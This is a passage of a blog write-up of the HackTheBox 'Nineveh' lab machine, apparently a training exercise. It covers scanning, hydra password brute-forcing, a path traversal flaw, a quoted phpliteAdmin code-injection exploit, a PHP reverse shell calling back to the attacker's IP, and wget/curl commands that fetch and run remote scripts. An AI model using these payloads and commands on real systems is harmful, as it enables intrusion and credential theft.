<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="author" content="Marco Meli">
  <meta name="description" content="Nineveh | Initial nmap root@SittingDucks:~# nmap -sV -sC 10.10.10.43 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 10:51 GMT Nmap scan report for...">

  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">

  
  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>

  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">

  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
  <script src="/tipuesearch_content.js"></script>
  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
  <script src="/theme/tipuesearch/tipuesearch.js"></script>
 


<meta name="keywords" content="HackTheBox">


  <title>Nineveh</title>

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-156989597-1', 'auto');
  ga('send', 'pageview');

</script>
  
</head>

<body class="home blog">
  <div>
    <header class="site-header">
      <nav class="navbar navbar-default" role="navigation"> 
	  
		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
		</form>
		
        <div class="container">
          <div class="row">
            <div class="site-navigation-inner col-sm-12">
              <div class="navbar-header">
                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
                  <span class="sr-only">Toggle navigation</span>
                  <span class="icon-bar"></span>
                  <span class="icon-bar"></span>
                  <span class="icon-bar"></span>
                </button>
              </div>
              <div class="collapse navbar-collapse navbar-ex1-collapse">
              <ul id="menu-all-pages" class="nav navbar-nav">
                <li class="menu-item"><a href="htts://sittingducks.io" >home
<i class="fa  fa-lg"></i></a></li>
              </ul>
              </div>
              <div class="social">   
                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
<i class="fa fa-linkedin fa-lg"></i></a>
                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
<i class="fa fa-twitter fa-lg"></i></a>
                <a href="https://github.com/M4rc0ff" title="github" >
<i class="fa fa-github fa-lg"></i></a>
              </div>
            </div>
          </div>
        </div>
      </nav><!-- .site-navigation -->

      <div class="container">
      <div id="logo">
        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
        </span><!-- end of .site-name -->
      </div><!-- end of #logo -->
        <div class="tagline">
                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
        </div>
    </div>

  </header><!-- #masthead -->
  </div>
    <div id="content" class="site-content">
      <div class="container main-content-area">
        <div class="row">
          <div class="main-content-inner col-sm-12 col-md-12">
            <div id="primary" class="content-area">
              <div id="main" class="site-main" role="main">
                <div class="article-container">
<article>
  <div class="blog-item-wrap">
    <div class="post-inner-content">
      <header class="entry-header page-header">
        <span class="cat-item"><time datetime="2020-01-04 09:56:00+00:00">Sat 04 January 2020</time></span>
        <h1 class="entry-title"><a href="https://sittingducks.io/Nineveh.html">Nineveh</a></h1>
      </header><!-- .entry-header -->
      <div class="fb-like" data-href="https://sittingducks.io/Nineveh.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
      <div class="entry-content">
        <h1 id="initial-nmap">Initial nmap</h1>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> nmap -sV -sC <span class="m">10</span>.10.10.43                                                                                                                                                         
<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 10:51 GMT                                                                                                                               </span>
<span class="go">Nmap scan report for 10.10.10.43                                                                                                                                                              </span>
<span class="go">Host is up (0.096s latency).                                                                                                                                                                  </span>
<span class="go">Not shown: 998 filtered ports                                                                                                                                                                 </span>
<span class="go">PORT    STATE SERVICE  VERSION                                                                                                                                                                </span>
<span class="go">80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))                                                                                                                                         </span>
<span class="go">|_http-server-header: Apache/2.4.18 (Ubuntu)                                                                                                                                                  </span>
<span class="go">|_http-title: Site doesn&#39;t have a title (text/html).                                                                                                                                          </span>
<span class="go">443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))                                                                                                                                         </span>
<span class="go">|_http-server-header: Apache/2.4.18 (Ubuntu)                                                                                                                                                  </span>
<span class="go">|_http-title: Site doesn&#39;t have a title (text/html).                                                                                                                                          </span>
<span class="go">| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR                                                                         </span>
<span class="go">| Not valid before: 2017-07-01T15:03:30                                                                                                                                                       </span>
<span class="go">|_Not valid after:  2018-07-01T15:03:30                                                                                                                                                       </span>
<span class="go">|_ssl-date: TLS randomness does not represent time                                                                                                                                            </span>
<span class="go">| tls-alpn:                                                                                                                                                                                   </span>
<span class="go">|_  http/1.1                                                                                                                                                                                  </span>

<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                </span>
<span class="go">Nmap done: 1 IP address (1 host up) scanned in 27.93 seconds                                 </span>
</pre></div>


<p>the nmap reveals two webservers, one on port 80 and one on port 443. The ssl-cert mentions a common name, <strong>nineveh.htb</strong> so I add an entry to my /et/hosts file and I browse the two webservers.</p>
<p>http://ninevsh.htb gives this page:</p>
<p><img alt="" src="../images/ninevesh-itworks.png"></p>
<p>https://ninevsh.htb gives this page</p>
<p><img alt="" src="../images/nineveh-https.png"></p>
<p>I looked at the html source of both pages and there is nothing useful there. So I decided to scan for directories: </p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> gobuster dir --url http://nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span class="m">100</span>                                                                    
<span class="go">===============================================================                                                                                                                               </span>
<span class="go">Gobuster v3.0.1                                                                                                                                                                               </span>
<span class="go">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)                                                                                                                               </span>
<span class="go">===============================================================                                                                                                                               </span>
<span class="go">[+] Url:            http://nineveh.htb                                                                                                                                                        </span>
<span class="go">[+] Threads:        100                                                                                                                                                                       </span>
<span class="go">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                                                              </span>
<span class="go">[+] Status codes:   200,204,301,302,307,401,403                                                                                                                                               </span>
<span class="go">[+] User Agent:     gobuster/3.0.1                                                                                                                                                            </span>
<span class="go">[+] Timeout:        10s                                                                                                                                                                       </span>
<span class="go">===============================================================                                                                                                                               </span>
<span class="go">2020/01/04 11:19:28 Starting gobuster                                                                                                                                                         </span>
<span class="go">===============================================================                                                                                                                               </span>
<span class="go">/department (Status: 301)                                                                                                                                                                     </span>
<span class="go">/server-status (Status: 403)                                                                                                                                                                  </span>
<span class="go">===============================================================                                                                                                                               </span>
<span class="go">2020/01/04 11:24:39 Finished                                                                                                                                                                  </span>
<span class="go">=============================================================== </span>
</pre></div>


<p>I get only one result, the <strong>department</strong> directory, and when I checked I found a login page:</p>
<p><img alt="" src="../images/nineveh-login.png"></p>
<p>and looking at the source for this page I get this:</p>
<p><img alt="" src="../images/nineveh-login-source.png"></p>
<p>the interesting bit in there is the comment in green that says that MySQL has been installed but the page must be fixed!</p>
<p>I was expecting some kind of sql injection. I tried all the combinations in this <a href="https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/">cheat sheet</a> but got nowhere. I also tried with sqlmap just in case but found nothing. So looks like there are no SQL injection vulnerabilities.</p>
<p>Then i noticed something by trying guessing names. I tried the user <strong>nineveh</strong> and noticed this error:</p>
<p><img alt="" src="../images/nineveh-invalid-user.png"></p>
<p>Instead when I tried the user <strong>admin</strong> I get a different error:</p>
<p><img alt="" src="../images/nineveh-invalid-password.png"></p>
<p>This is an indication that <strong>admin</strong> could be a valid user. With that in mind we can try to perfom a brute force attack.</p>
<p>First I launch burpsuite to capture the POST request of when I submit username and password:</p>
<div class="highlight"><pre><span></span><span class="go">POST /department/login.php HTTP/1.1</span>
<span class="go">Host: 10.10.10.43</span>
<span class="go">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
<span class="go">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="go">Accept-Language: en-US,en;q=0.5</span>
<span class="go">Accept-Encoding: gzip, deflate</span>
<span class="go">Content-Type: application/x-www-form-urlencoded</span>
<span class="go">Content-Length: 32</span>
<span class="go">DNT: 1</span>
<span class="go">Connection: close</span>
<span class="go">Referer: http://10.10.10.43/department/login.php</span>
<span class="go">Cookie: PHPSESSID=pbv0s4021i456d0feorsps7u26</span>
<span class="go">Upgrade-Insecure-Requests: 1</span>

<span class="go">username=admin&amp;password=password</span>
</pre></div>


<p>and then I launch hydra:</p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> hydra nineveh.htb -l admin -P /usr/share/wordlists/rockyou.txt http-form-post <span class="s2">&quot;/department/login.php:username=^USER^&amp;password=^PASS^:Invalid Password!&quot;</span> -t <span class="m">64</span> -V                 
<span class="go">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.                                                               </span>

<span class="go">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-05 16:56:54                                                                                                            </span>
<span class="go">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore                                </span>
<span class="go">[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task                                                                             </span>
<span class="go">[DATA] attacking http-post-form://nineveh.htb:80/department/login.php:username=^USER^&amp;password=^PASS^:Invalid Password!                                                                       </span>
<span class="go">[ATTEMPT] target nineveh.htb - login &quot;admin&quot; - pass &quot;123456&quot; - 1 of 14344399 [child 0] (0/0)                                                                                                  </span>
<span class="go">[ATTEMPT] target nineveh.htb - login &quot;admin&quot; - pass &quot;12345&quot; - 2 of 14344399 [child 1] (0/0)                                                                                                   </span>
<span class="go">[ATTEMPT] target nineveh.htb - login &quot;admin&quot; - pass &quot;123456789&quot; - 3 of 14344399 [child 2] (0/0)</span>
<span class="go">.</span>
<span class="go">.</span>
<span class="go">&lt;SNIP&gt;</span>
<span class="go">.</span>
<span class="go">.</span>
<span class="go">[ATTEMPT] target nineveh.htb - login &quot;admin&quot; - pass &quot;escorpio&quot; - 4638 of 14344399 [child 54] (0/0)</span>
<span class="go">[ATTEMPT] target nineveh.htb - login &quot;admin&quot; - pass &quot;elvis1&quot; - 4639 of 14344399 [child 23] (0/0)</span>
<span class="go">[ATTEMPT] target nineveh.htb - login &quot;admin&quot; - pass &quot;einstein&quot; - 4640 of 14344399 [child 34] (0/0)</span>
<span class="go">[ATTEMPT] target nineveh.htb - login &quot;admin&quot; - pass &quot;carola&quot; - 4641 of 14344399 [child 43] (0/0)</span>
<span class="go">[ATTEMPT] target nineveh.htb - login &quot;admin&quot; - pass &quot;benjamin1&quot; - 4642 of 14344399 [child 9] (0/0)</span>
<span class="go">[80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t</span>
<span class="go">1 of 1 target successfully completed, 1 valid password found</span>
<span class="go">[WARNING] Writing restore file because 1 final worker threads did not complete until end.</span>
<span class="go">[ERROR] 1 target did not resolve or could not be connected</span>
<span class="go">[ERROR] 0 targets did not complete</span>
<span class="go">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-05 16:58:00</span>
</pre></div>


<p>after few minutes I found the password and I got this page after logging in:</p>
<p><img alt="" src="../images/nineveh-construction.png"></p>
<p>and if I nagivate to the <strong>Notes</strong> menu I get this:</p>
<p><img alt="" src="../images/nineveh-notes.png"></p>
<p>It is important to note the URL of the "Notes" menu which points to a file (ninevehNotes.txt) to read from. I started having a look at potential path traversal vulnerabilty and I after trying few combinations I was able to read the passwd file using this path <strong>../../../../../../../etc/passwd</strong></p>
<p><img alt="" src="../images/nineveh-traversal.png"></p>
<p>One strange thing I noticed is that this should be working also without <strong>files/ninevehNotes.txt</strong> string but for some reasons it doesn't. </p>
<p><img alt="" src="../images/nineveh-traversal-nonote.png"></p>
<p>In fact, we are getting the message <strong><em>No Note is selected</em></strong> as shown above. After numerous tests I realized there is some kind of filter in the code that if detects the word <strong>ninevehNotes</strong> is missing from the string it throws the message <strong><em>No Note is selected</em></strong> and the LFI does not work.</p>
<p>Another shorter string I managed to successfully verify is this</p>
<p><code>http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../etc/passwd</code></p>
<p>I spent some more time playing around with this but I got nowhere so I left it for the time being and I moved to enumerating on the SSL page.</p>
<p>I launched gobuster against the https://nineveh.htb which revealed three  directories:</p>
<div class="highlight"><pre><span></span><span class="gp">user@SittingDucks:~$</span> gobuster dir -u https://nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span class="m">50</span> -k
<span class="go">===============================================================</span>
<span class="go">Gobuster v3.0.1</span>
<span class="go">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
<span class="go">===============================================================</span>
<span class="go">[+] Url:            https://nineveh.htb</span>
<span class="go">[+] Threads:        50</span>
<span class="go">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
<span class="go">[+] Status codes:   200,204,301,302,307,401,403</span>
<span class="go">[+] User Agent:     gobuster/3.0.1</span>
<span class="go">[+] Timeout:        10s</span>
<span class="go">===============================================================</span>
<span class="go">2020/01/18 09:17:58 Starting gobuster</span>
<span class="go">===============================================================</span>
<span class="go">/db (Status: 301)</span>
<span class="go">/server-status (Status: 403)</span>
<span class="go">/secure_notes (Status: 301)</span>
<span class="go">===============================================================</span>
<span class="go">2020/01/18 09:20:18 Finished</span>
<span class="go">===============================================================</span>
</pre></div>


<p>After browsing the https://nineveh.htb/db we find ourselves at another login page, this time is for the application phpliteAdmin v1.9</p>
<p><img alt="" src="../images/nineveh-db.png"></p>
<div class="highlight"><pre><span></span><span class="gp">#</span> Exploit Title: phpliteadmin &lt;<span class="o">=</span> <span class="m">1</span>.9.3 Remote PHP Code Injection Vulnerability
<span class="gp">#</span> Google Dork: inurl:phpliteadmin.php <span class="o">(</span>Default PW: admin<span class="o">)</span>
<span class="gp">#</span> Date: <span class="m">01</span>/10/2013
<span class="gp">#</span> Exploit Author: L@usch - http://la.usch.io - http://la.usch.io/files/exploits/phpliteadmin-1.9.3.txt
<span class="gp">#</span> Vendor Homepage: http://code.google.com/p/phpliteadmin/
<span class="gp">#</span> Vendor Status: Informed
<span class="gp">#</span> Software Link: http://phpliteadmin.googlecode.com/files/phpliteadmin_v1-9-3.zip
<span class="gp">#</span> Version: <span class="m">1</span>.9.3
<span class="gp">#</span> Tested on: Windows and Linux

<span class="go">Description:</span>

<span class="go">phpliteadmin.php#1784: &#39;Creating a New Database&#39; =&gt; </span>
<span class="go">phpliteadmin.php#1785: &#39;When you create a new database, the name you entered will be appended with the appropriate file extension (.db, .db3, .sqlite, etc.) if you do not include it yourself. The database will be created in the directory you specified as the $directory variable.&#39;,</span>

<span class="go">An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser.</span>

<span class="go">Proof of Concept:</span>

<span class="go">1. We create a db named &quot;hack.php&quot;.</span>
<span class="gp gp-VirtualEnv">(Depending on Server configuration sometimes it will not work and the name for the db will be &quot;hack.sqlite&quot;. Then simply try to rename the database / existing database to &quot;hack.php&quot;.)</span>
<span class="go">The script will store the sqlite database in the same directory as phpliteadmin.php.</span>
<span class="go">Preview: http://goo.gl/B5n9O</span>
<span class="go">Hex preview: http://goo.gl/lJ5iQ</span>

<span class="go">2. Now create a new table in this database and insert a text field with the default value:</span>
<span class="go">&lt;?php phpinfo()?&gt;</span>
<span class="go">Hex preview: http://goo.gl/v7USQ</span>

<span class="go">3. Now we run hack.php</span>

<span class="go">Done!</span>

<span class="go">Proof: http://goo.gl/ZqPVL</span>
</pre></div>


<p>Looking for exploits with <strong>searchsploit</strong> I found an interesting one (24044) but, as per the above description, it requires for us to be logged in and create a database. </p>
<p>Now I use the same bruteforce technique I used earlier with hybra with some small adjustments. Since we don't have a user I can specify anything I want (just left admin). </p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> hydra nineveh.htb -l admin -P /usr/share/wordlists/rockyou.txt https-form-post <span class="s2">&quot;/db/index.php:password=^PASS^&amp;remember=yes&amp;login=Log+In&amp;proc_login=true:Incorrect password.&quot;</span>  -t 
<span class="go">64 -V -s 443                                                                                                                                                                                  </span>
<span class="go">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.                                                               </span>

<span class="go">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-18 09:43:23                                                                                                            </span>
<span class="go">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore                                </span>
<span class="go">[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task                                                                             </span>
<span class="go">[DATA] attacking http-post-forms://nineveh.htb:443/db/index.php:password=^PASS^&amp;remember=yes&amp;login=Log+In&amp;proc_login=true:Incorrect password.                                                 </span>
<span class="go">[ATTEMPT] target nineveh.htb - login &quot;admin&quot; - pass &quot;123456&quot; - 1 of 14344399 [child 0] (0/0)                                                                                                  </span>
<span class="go">[ATTEMPT] target nineveh.htb - login &quot;admin&quot; - pass &quot;12345&quot; - 2 of 14344399 [child 1] (0/0)                                                                                                   </span>
<span class="go">[ATTEMPT] target nineveh.htb - login &quot;admin&quot; - pass &quot;123456789&quot; - 3 of 14344399 [child 2] (0/0)                                                      </span>
<span class="go">.</span>
<span class="go">.</span>
<span class="go">&lt;SNIP&gt;</span>
<span class="go">.</span>
<span class="go">.</span>
<span class="go">[ATTEMPT] target nineveh.htb - login &quot;admin&quot; - pass &quot;alexia&quot; - 1451 of 14344399 [child 40] (0/0)</span>
<span class="go">[443][http-post-form] host: nineveh.htb   login: admin   password: password123</span>
<span class="go">1 of 1 target successfully completed, 1 valid password found</span>
<span class="go">[WARNING] Writing restore file because 1 final worker threads did not complete until end.</span>
<span class="go">[ERROR] 1 target did not resolve or could not be connected</span>
<span class="go">[ERROR] 0 targets did not complete</span>
<span class="go">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-18 09:43:54</span>
</pre></div>


<p>Now we know the password is <strong>password123</strong> so we can log in:</p>
<p><img alt="" src="../images/nineveh-phplite.png"></p>
<p>Let us know try to apply the exploit we found previously (24044).</p>
<p>The instructions of the exploit state to create a database named hack.php with a table and default value of <strong>&lt;?php phpinfo()?&gt;</strong> so I did as instructed:</p>
<p><img alt="" src="../images/nineveh-table.png"></p>
<p>Now, considering we have previously found a path traveral we can try to use the same techique but instead of reading the /etc/passwd file we can read the hack.php file knowing that the path is <strong>/var/tmp/hack.php</strong> from the above screenshots.</p>
<p><img alt="" src="../images/nineveh-phpinfo.png"></p>
<p>As expected, because we have an LFI vulnerabiity, I am able to run the phpinfo page using the URL in the screenshot above. Now we can simply replace the code <strong>&lt;?php phpinfo()?&gt;</strong> with a php shell and we should be able to get a shell back.</p>
<p>I got the following php shell from the Internet where I place my IP and a port (9999 in this case).</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="nv">$sock</span><span class="o">=</span><span class="nb">fsockopen</span><span class="p">(</span><span class="s2">&quot;10.10.14.5&quot;</span><span class="p">,</span><span class="mi">9999</span><span class="p">);</span><span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span><span class="p">);</span><span class="cp">?&gt;</span>
</pre></div>


<p>then I create another database called shell.php using the same procedure I used before from he phplite admin panel and in the default value I add the shell code:</p>
<p><img alt="" src="../images/nineveh-dbshell.png"></p>
<p>Then I create a netcat listener on my kali box and when I browse the URL http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt/../var/tmp/shell.phpand I get the following:</p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> nc -lvnp <span class="m">9999</span>
<span class="go">listening on [any] 9999 ...</span>
<span class="go">connect to [10.10.14.5] from (UNKNOWN) [10.10.10.43] 56376</span>
<span class="gp">root@SittingDucks:~#</span>
</pre></div>


<p>Although the connection seems to work I am unable to get the shell. After several unsuccessful attempts, I changed methodology and instead of placing the shell in the database default value field I place the shell in my kali box and make it available through a python simple http server.</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;wget http://10.10.14.5:8000/shellcode.php -O /tmp/shellcode.php ;php /tmp/shellcode.php&quot;</span><span class="p">);</span><span class="o">&gt;</span>
</pre></div>


<p>That being said i will use the same procedure but now I will add the above code in the shell.php database default value.</p>
<p>With this method we finally got a working shell which I upgraded to a full pty shell with the below python command:</p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> nc -lvnp <span class="m">9999</span>
<span class="go">listening on [any] 9999 ...</span>


<span class="go">connect to [10.10.14.5] from (UNKNOWN) [10.10.10.43] 56380</span>
<span class="go">Linux nineveh 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span>
<span class="go"> 06:04:38 up  1:53,  0 users,  load average: 0.03, 0.08, 0.04</span>
<span class="go">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span>
<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
<span class="go">/bin/sh: 0: can&#39;t access tty; job control turned off</span>
<span class="gp">$</span> $ $ 
<span class="gp">$</span> python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span> 
<span class="go">/bin/sh: 4: python: not found</span>
<span class="gp">$</span> python3 -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
<span class="gp">www-data@nineveh:/$</span>
</pre></div>


<p>From the output of the /etc/passwd we know there are 2 users with valid shell, that is <strong>root</strong> and <strong>amrois</strong>.</p>
<div class="highlight"><pre><span></span><span class="gp">www-data@nineveh:/home/amrois$</span> ls -l
<span class="go">ls -l</span>
<span class="go">total 4</span>
<span class="go">-rw------- 1 amrois amrois 33 Jul  2  2017 user.txt</span>
</pre></div>


<p>The user.txt is there but we can't read it as we are www-data user and we don't have permissions.</p>
<div class="highlight"><pre><span></span><span class="gp">www-data@nineveh:/$</span> curl http://10.10.14.5:8000/LinEnum.sh<span class="p">|</span> bash
</pre></div>


<p>At this stage I launched the above command which ran the LinEnu.sh script located in my kali box. I did not find anything useful in the output.</p>
<p>I then had look at the <strong>secure_notes</strong> directory previously with gobuster which sounds interesting. From experience the word <strong>secret</strong> could mean there is something hidden in the hackthebox world.</p>
<p><img alt="" src="../images/nineveh-secure_notes.png"></p>
<p>Browsing to the directory I see only the above picture. However, since the directory states <strong>secure_notes</strong> I decided to dig deeper and dowload the picture in my kali box and inspect it with <strong>binwalk</strong>.</p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/nineveh#</span> binwalk nineveh.png

<span class="go">DECIMAL       HEXADECIMAL     DESCRIPTION</span>
<span class="go">--------------------------------------------------------------------------------</span>
<span class="go">0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced</span>
<span class="go">84            0x54            Zlib compressed data, best compression</span>
<span class="go">2881744       0x2BF8D0        POSIX tar archive (GNU)</span>
</pre></div>


<p>The <strong>binwalk</strong> command against the picure shows us there is a Zlib compressed folder inside the image. To extract it we run again the same command with the <strong>-Me</strong> option</p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/nineveh#</span> binwalk -Me nineveh.png                                                                                                                     

<span class="go">Scan Time:     2020-01-19 15:16:04                                                                                                                                                            </span>
<span class="go">Target File:   /home/user/Documents/htb/boxes/nineveh/nineveh.png                                                                                                                             </span>
<span class="go">MD5 Checksum:  353b8f5a4578e4472c686b6e1f15c808                                                                                                                                               </span>
<span class="go">Signatures:    391                                                                                                                                                                            </span>

<span class="go">DECIMAL       HEXADECIMAL     DESCRIPTION                                                                                                                                                     </span>
<span class="go">--------------------------------------------------------------------------------</span>
<span class="go">0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced</span>
<span class="go">84            0x54            Zlib compressed data, best compression</span>
<span class="go">2881744       0x2BF8D0        POSIX tar archive (GNU)</span>


<span class="go">Scan Time:     2020-01-19 15:16:04</span>
<span class="go">Target File:   /home/user/Documents/htb/boxes/nineveh/_nineveh.png.extracted/54</span>
<span class="go">MD5 Checksum:  d41d8cd98f00b204e9800998ecf8427e </span>
<span class="go">Signatures:    391</span>

<span class="go">DECIMAL       HEXADECIMAL     DESCRIPTION</span>
<span class="go">--------------------------------------------------------------------------------</span>


<span class="go">Scan Time:     2020-01-19 15:16:04</span>
<span class="go">Target File:   /home/user/Documents/htb/boxes/nineveh/_nineveh.png.extracted/secret/nineveh.priv</span>
<span class="go">MD5 Checksum:  f426d661f94b16292efc810ebb7ea305 </span>
<span class="go">Signatures:    391</span>

<span class="go">DECIMAL       HEXADECIMAL     DESCRIPTION</span>
<span class="go">--------------------------------------------------------------------------------</span>
<span class="go">0             0x0             PEM RSA private key</span>


<span class="go">Scan Time:     2020-01-19 15:16:04</span>
<span class="go">Target File:   /home/user/Documents/htb/boxes/nineveh/_nineveh.png.extracted/secret/nineveh.pub </span>
<span class="go">MD5 Checksum:  6b60618d207ad97e76664174e805cfda </span>
<span class="go">Signatures:    391</span>

<span class="go">DECIMAL       HEXADECIMAL     DESCRIPTION</span>
<span class="go">--------------------------------------------------------------------------------</span>
<span class="go">0             0x0             OpenSSH RSA public key</span>
</pre></div>


<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/nineveh#</span> ll
<span class="go">total 2840</span>
<span class="go">-rwxrwxrwx 1 root root 2891984 Jan 19 15:09 nineveh.png</span>
<span class="go">drwxrwxr-x 3 root root    4096 Jan 19 15:16 _nineveh.png.extracted</span>
<span class="go">-rwxr-xr-x 1 root root     514 Jan  5 08:32 post.html</span>
<span class="go">-rwxr-xr-x 1 root root    3251 Jan 19 11:59 shell.php</span>
<span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/nineveh#</span> <span class="nb">cd</span> _nineveh.png.extracted/
<span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/nineveh/_nineveh.png.extracted#</span> ll
<span class="go">total 2844</span>
<span class="go">-rw-rw-r-- 1 root     root       10240 Jan 19 15:16 2BF8D0.tar</span>
<span class="go">-rw-rw-r-- 1 root     root           0 Jan 19 15:16 54</span>
<span class="go">-rw-rw-r-- 1 root     root     2891900 Jan 19 15:16 54.zlib</span>
<span class="go">drwxr-xr-x 2 www-data www-data    4096 Jul  2  2017 secret</span>
<span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/nineveh/_nineveh.png.extracted#</span> <span class="nb">cd</span> secret/
<span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/nineveh/_nineveh.png.extracted/secret#</span> ll
<span class="go">total 8</span>
<span class="go">-rw------- 1 www-data www-data 1675 Jul  2  2017 nineveh.priv</span>
<span class="go">-rw-r--r-- 1 www-data www-data  400 Jul  2  2017 nineveh.pub</span>
</pre></div>


<p>There is a private/public key pair we can potentially use to ssh to the box. We can try to use the user <strong>amrois</strong> we found in the /etc/passwd output. </p>
<p>Our initial <strong>nmap</strong> had not revealed port 22 as opened but I remembered that when I ran LinEnum.sh I saw this:</p>
<div class="highlight"><pre><span></span><span class="go">[-] Listening TCP:                                                                             </span>
